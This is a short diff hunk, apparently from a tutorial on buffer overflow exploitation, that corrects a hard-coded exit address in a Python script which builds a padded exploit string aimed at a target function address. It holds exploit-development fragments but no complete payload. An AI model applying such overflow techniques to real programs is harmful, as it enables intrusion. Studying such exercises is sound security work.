@@ -39,7 +39,7 @@ We can then use python program, that we can use to build the exploit string.
 import struct
 
 outsideFunctionAddress = 0x5555555551a9
-EXIT_Address= 0x555555601040
+EXIT_Address= 0x555555551040
 
 def pad(s):
     return s+"X"*(512-len(s)-16)
